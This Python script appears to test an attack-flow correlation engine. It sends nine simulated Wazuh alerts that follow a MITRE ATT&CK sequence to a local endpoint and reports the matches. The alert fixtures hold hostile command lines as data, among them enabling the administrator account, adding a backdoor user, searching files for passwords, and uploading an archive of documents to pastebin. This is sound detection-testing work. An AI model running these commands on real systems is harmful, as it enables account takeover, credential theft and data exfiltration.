import requests
import json
import time

# Sequential attack flow alerts following the sequence:
# T1078.001 -> T1135 -> T1046 -> T1083 -> T1552.001 -> T1078.003 -> T1083 -> T1005 -> T1567.003

wazuh_alerts = [
    # Step 1: T1078.001 - Valid Accounts: Default Accounts
    {
        "timestamp": "2023-05-15T14:30:00.123Z",
        "agent": {
            "id": "001",
            "name": "windows-workstation-01",
            "ip": "192.168.1.100"
        },
        "rule": {
            "id": "91540",
            "level": 10,
            "description": "User account manipulation detected",
            "mitre": {
                "id": ["T1078.001"],
                "tactic": ["Initial Access", "Persistence", "Privilege Escalation"],
                "technique": ["Valid Accounts: Default Accounts"]
            }
        },
        "data": {
            "win": {
                "eventdata": {
                    "utcTime": "2023-05-15 14:30:00.000",
                    "processId": "4567",
                    "image": "C:\\Windows\\System32\\net.exe",
                    "parentImage": "C:\\Windows\\System32\\cmd.exe",
                    "parentProcessId": "123",
                    "commandLine": "net user administrator /active:yes",
                    "user": "SYSTEM",
                    "targetUserName": "administrator"
                },
                "system": {
                    "eventID": "4688",
                    "eventRecordID": "123450",
                    "processID": "0x1",
                    "threadID": "0x1",
                    "channel": "Security",
                    "computer": "windows-workstation-01",
                    "severityValue": "WARNING",
                    "message": "A new process has been created."
                }
            }
        }
    },
    
    # Step 2: T1135 - Network Share Discovery
    {
        "timestamp": "2023-05-15T14:35:00.456Z",
        "agent": {
            "id": "001",
            "name": "windows-workstation-01",
            "ip": "192.168.1.100"
        },
        "rule": {
            "id": "91541",
            "level": 8,
            "description": "SMB share enumeration via PowerShell detected",
            "mitre": {
                "id": ["T1135"],
                "tactic": ["Discovery"],
                "technique": ["Network Share Discovery"]
            }
        },
        "data": {
            "win": {
                "eventdata": {
                    "utcTime": "2023-05-15 14:35:00.123",
                    "processId": "3456",
                    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "parentImage": "C:\\Windows\\System32\\cmd.exe",
                    "parentProcessId": "1234",
                    "commandLine": "powershell.exe -Command \"Get-SmbShare\"",
                    "user": "DOMAIN\\Administrator"
                },
                "system": {
                    "eventID": "4688",
                    "eventRecordID": "123452",
                    "processID": "0x3",
                    "threadID": "0x3",
                    "channel": "Security",
                    "computer": "windows-workstation-01",
                    "severityValue": "INFO",
                    "message": "A new process has been created."
                }
            }
        }
    },

    # Step 3: T1046 - Network Service Discovery
    {
        "timestamp": "2023-05-15T14:40:00.789Z",
        "agent": {
            "id": "001",
            "name": "windows-workstation-01",
            "ip": "192.168.1.100"
        },
        "rule": {
            "id": "91542",
            "level": 8,
            "description": "Remote Desktop Services enumeration via PowerShell detected",
            "mitre": {
                "id": ["T1046"],
                "tactic": ["Discovery"],
                "technique": ["Network Service Discovery"]
            }
        },
        "data": {
            "win": {
                "eventdata": {
                    "utcTime": "2023-05-15 14:40:00.456",
                    "processId": "3456",
                    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "parentImage": "C:\\Windows\\System32\\cmd.exe",
                    "parentProcessId": "2345",
                    "commandLine": "powershell.exe -Command \"Get-Service -Name 'Remote Desktop Services'\"",
                    "user": "DOMAIN\\Administrator"
                },
                "system": {
                    "eventID": "4688",
                    "eventRecordID": "123452",
                    "processID": "0x3",
                    "threadID": "0x3",
                    "channel": "Security",
                    "computer": "windows-workstation-01",
                    "severityValue": "INFO",
                    "message": "A new process has been created."
                }
            }
        }
    },
    
    # Step 4: T1083 - File and Directory Discovery (First instance)
    {
        "timestamp": "2023-05-15T14:45:00.012Z",
        "agent": {
            "id": "001",
            "name": "windows-workstation-01",
            "ip": "192.168.1.100"
        },
        "rule": {
            "id": "91543",
            "level": 8,
            "description": "File and directory enumeration detected",
            "mitre": {
                "id": ["T1083"],
                "tactic": ["Discovery"],
                "technique": ["File and Directory Discovery"]
            }
        },
        "data": {
            "win": {
                "eventdata": {
                    "utcTime": "2023-05-15 14:45:00.789",
                    "processId": "4567",
                    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "parentImage": "C:\\Windows\\explorer.exe",
                    "parentProcessId": "3456",
                    "commandLine": "powershell.exe -Command \"get-childitem -Recurse C:\\Users\"",
                    "user": "DOMAIN\\Administrator"
                },
                "system": {
                    "eventID": "4688",
                    "eventRecordID": "123453",
                    "processID": "0x4",
                    "threadID": "0x4",
                    "channel": "Security",
                    "computer": "windows-workstation-01",
                    "severityValue": "INFO",
                    "message": "A new process has been created."
                }
            }
        }
    },
    
    # Step 5: T1552.001 - Credentials in Files
    {
        "timestamp": "2023-05-15T14:50:00.345Z",
        "agent": {
            "id": "001",
            "name": "windows-workstation-01",
            "ip": "192.168.1.100"
        },
        "rule": {
            "id": "91544",
            "level": 10,
            "description": "Credential hunting in files detected",
            "mitre": {
                "id": ["T1552.001"],
                "tactic": ["Credential Access"],
                "technique": ["Unsecured Credentials: Credentials In Files"]
            }
        },
        "data": {
            "win": {
                "eventdata": {
                    "utcTime": "2023-05-15 14:50:00.012",
                    "processId": "5678",
                    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "parentImage": "C:\\Windows\\System32\\cmd.exe",
                    "parentProcessId": "4567",
                    "commandLine": "powershell.exe -Command \"select-string -Path C:\\Users\\*.txt,C:\\Users\\*.xml,C:\\Users\\*.config -Pattern password\"",
                    "user": "DOMAIN\\Administrator"
                },
                "system": {
                    "eventID": "4688",
                    "eventRecordID": "123454",
                    "processID": "0x5",
                    "threadID": "0x5",
                    "channel": "Security",
                    "computer": "windows-workstation-01",
                    "severityValue": "WARNING",
                    "message": "A new process has been created."
                }
            }
        }
    },
    
    # Step 6: T1078.003 - Valid Accounts: Local Accounts (Account Creation)
    {
        "timestamp": "2023-05-15T14:55:00.678Z",
        "agent": {
            "id": "001",
            "name": "windows-workstation-01",
            "ip": "192.168.1.100"
        },
        "rule": {
            "id": "91545",
            "level": 10,
            "description": "Local user account creation detected",
            "mitre": {
                "id": ["T1078.003"],
                "tactic": ["Persistence", "Privilege Escalation"],
                "technique": ["Valid Accounts: Local Accounts"]
            }
        },
        "data": {
            "win": {
                "eventdata": {
                    "utcTime": "2023-05-15 14:55:00.345",
                    "processId": "6789",
                    "image": "C:\\Windows\\System32\\net.exe",
                    "parentImage": "C:\\Windows\\System32\\cmd.exe",
                    "parentProcessId": "5678",
                    "commandLine": "net user art-test P@ssw0rd123! /add",
                    "user": "SYSTEM",
                    "targetUserName": "art-test",
                    "targetSid": "S-1-5-21-123456789-123456789-123456789-1001"
                },
                "system": {
                    "eventID": "4720",
                    "eventRecordID": "123455",
                    "processID": "0x6",
                    "threadID": "0x6",
                    "channel": "Security",
                    "computer": "windows-workstation-01",
                    "severityValue": "INFO",
                    "message": "A user account was created."
                }
            }
        }
    },
    
    # Step 7: T1083 - File and Directory Discovery (Second instance)
    {
        "timestamp": "2023-05-15T15:00:00.901Z",
        "agent": {
            "id": "001",
            "name": "windows-workstation-01",
            "ip": "192.168.1.100"
        },
        "rule": {
            "id": "91546",
            "level": 8,
            "description": "Systematic file enumeration detected",
            "mitre": {
                "id": ["T1083"],
                "tactic": ["Discovery"],
                "technique": ["File and Directory Discovery"]
            }
        },
        "data": {
            "win": {
                "eventdata": {
                    "utcTime": "2023-05-15 15:00:00.678",
                    "processId": "7890",
                    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "parentImage": "C:\\Windows\\System32\\cmd.exe",
                    "parentProcessId": "6789",
                    "commandLine": "powershell.exe -Command \"get-childitem -recurse -Path C:\\ -Include *.doc,*.docx,*.pdf,*.xls,*.xlsx -ErrorAction SilentlyContinue\"",
                    "user": "DOMAIN\\Administrator"
                },
                "system": {
                    "eventID": "4688",
                    "eventRecordID": "123456",
                    "processID": "0x7",
                    "threadID": "0x7",
                    "channel": "Security",
                    "computer": "windows-workstation-01",
                    "severityValue": "INFO",
                    "message": "A new process has been created."
                }
            }
        }
    },
    
    # Step 8: T1005 - Data from Local System
    {
        "timestamp": "2023-05-15T15:05:00.234Z",
        "agent": {
            "id": "001",
            "name": "windows-workstation-01",
            "ip": "192.168.1.100"
        },
        "rule": {
            "id": "91547",
            "level": 10,
            "description": "Sensitive data collection detected",
            "mitre": {
                "id": ["T1005"],
                "tactic": ["Collection"],
                "technique": ["Data from Local System"]
            }
        },
        "data": {
            "win": {
                "eventdata": {
                    "utcTime": "2023-05-15 15:05:00.901",
                    "processId": "8901",
                    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "parentImage": "C:\\Windows\\System32\\cmd.exe",
                    "parentProcessId": "7890",
                    "commandLine": "powershell.exe -Command \"Compress-Archive -Path C:\\Users\\Documents\\* -DestinationPath C:\\temp\\data.zip\"",
                    "user": "DOMAIN\\Administrator",
                    "targetFilename": "C:\\temp\\data.zip"
                },
                "system": {
                    "eventID": "4688",
                    "eventRecordID": "123457",
                    "processID": "0x8",
                    "threadID": "0x8",
                    "channel": "Security",
                    "computer": "windows-workstation-01",
                    "severityValue": "WARNING",
                    "message": "A new process has been created."
                }
            }
        }
    },
    
    # Step 9: T1567 - Exfiltration Over Web Service
    {
        "timestamp": "2023-05-15T15:10:00.567Z",
        "agent": {
            "id": "001",
            "name": "windows-workstation-01",
            "ip": "192.168.1.100"
        },
        "rule": {
            "id": "91548",
            "level": 12,
            "description": "Data exfiltration over web service detected",
            "mitre": {
                "id": ["T1567.003"],
                "tactic": ["Exfiltration"],
                "technique": ["Exfiltration Over Web Service"]
            }
        },
        "data": {
            "win": {
                "eventdata": {
                    "utcTime": "2023-05-15 15:10:00.234",
                    "processId": "9012",
                    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "parentImage": "C:\\Windows\\System32\\cmd.exe",
                    "parentProcessId": "8901",
                    "commandLine": "powershell.exe -Command \"Invoke-WebRequest -Uri 'https://pastebin.com/api/api_post.php' -Method POST -Body @{api_dev_key='abc123'; api_option='paste'; api_paste_code=(Get-Content 'C:\\temp\\data.zip' -Raw)}\"",
                    "user": "DOMAIN\\Administrator"
                },
                "system": {
                    "eventID": "4688",
                    "eventRecordID": "123458",
                    "processID": "0x9",
                    "threadID": "0x9",
                    "channel": "Security",
                    "computer": "windows-workstation-01",
                    "severityValue": "CRITICAL",
                    "message": "A new process has been created."
                }
            },
            "network": {
                "protocol": "HTTPS",
                "destination": {
                    "ip": "104.20.208.187",
                    "port": "443",
                    "domain": "pastebin.com"
                },
                "source": {
                    "ip": "192.168.1.100",
                    "port": "49152"
                }
            }
        }
    }
]


def send_wazuh_alerts(base_url='http://localhost:8000/wazuh-alerts'):
    """
    Send Wazuh alerts to the specified endpoint
    
    :param base_url: Base URL for sending Wazuh alerts (default: localhost)
    :return: List of response statuses
    """
    responses = []
    
    print("Starting attack flow simulation...")
    print("=" * 60)
    
    for index, alert in enumerate(wazuh_alerts, 1):
        try:
            print(f"\n📨 Sending Alert {index}:")
            print(f"   MITRE ID: {alert['rule']['mitre']['id'][0]}")
            print(f"   Description: {alert['rule']['description']}")
            print(f"   Source IP: {alert['agent']['ip']}")
            
            # Send POST request
            response = requests.post(
                base_url, 
                headers={'Content-Type': 'application/json'},
                data=json.dumps(alert),
                # timeout=10
            )
            
            print(f"   Status Code: {response.status_code}")
            
            if response.status_code == 200:
                try:
                    response_data = response.json()
                    print(f"   ✅ Response Status: {response_data.get('status')}")
                    
                    # Print correlation result (now single dict or None)
                    correlation_result = response_data.get('correlation_results')  # Note: keeping original field name
                    
                    if correlation_result and correlation_result.get('validation') != "pattern_mismatch":
                        print(f"   🎯 MATCHED! Correlation found:")
                        print(f"      - Technique: {correlation_result.get('technique_id')}")
                        print(f"      - Node: {correlation_result.get('node_name')}")
                        print(f"      - Validation: {correlation_result.get('validation')}")
                        print(f"      - State Advanced: {correlation_result.get('state_advanced', False)}")
                        if correlation_result.get('next_position'):
                            print(f"      - Next Position: {correlation_result.get('next_position')}")
                    elif correlation_result is None:
                        print(f"   ❌ No correlation match found")
                    else:
                        print(f"   ⚠️  Pattern validation failed for technique {correlation_result.get('technique_id')}")
                    
                    # Print flow status
                    flow_status = response_data.get('attack_flow_status', {})
                    print(f"   📊 Flow Status:")
                    print(f"      - Current Position: {flow_status.get('current_position')}")
                    print(f"      - Sequence Valid: {flow_status.get('sequence_valid')}")
                    print(f"      - Flow Completed: {response_data.get('flow_completed', False)}")
                    
                    if response_data.get('flow_completed'):
                        print(f"   🎉 ATTACK FLOW COMPLETED!")
                        context_state = response_data.get('context_state', {})
                        attack_path = context_state.get('attack_path', [])
                        print(f"   📈 Complete Attack Path:")
                        for step in attack_path:
                            print(f"      Step {step.get('step')}: {step.get('technique_id')} - {step.get('node_name')}")
                    
                except json.JSONDecodeError:
                    print(f"   ⚠️  Could not parse JSON response")
                    print(f"   Response text: {response.text[:200]}...")
            else:
                print(f"   ❌ Error response: {response.text[:200]}...")
            
            # Store response for analysis
            responses.append({
                'alert_index': index,
                'mitre_id': alert['rule']['mitre']['id'][0],
                'status_code': response.status_code,
                'description': alert['rule']['description'],
                'response_data': response.json() if response.status_code == 200 else None
            })
            
            # Add small delay between requests to see progression clearly
            time.sleep(1)
            
        except requests.RequestException as e:
            print(f"   ❌ Error sending alert {index}: {e}")
            responses.append({
                'alert_index': index,
                'mitre_id': alert['rule']['mitre']['id'][0],
                'status_code': 'ERROR',
                'error': str(e)
            })
    
    return responses


def main():
    """
    Main function to demonstrate sending Wazuh alerts
    """
    print("Sending Wazuh Alerts...")
    results = send_wazuh_alerts()
    
    # Optional: More detailed reporting
    print("\nAlert Sending Summary:")
    for result in results:
        print(f"- {result['mitre_id']}: {result['description']} (Status: {result['status_code']})")

if __name__ == '__main__':
    main()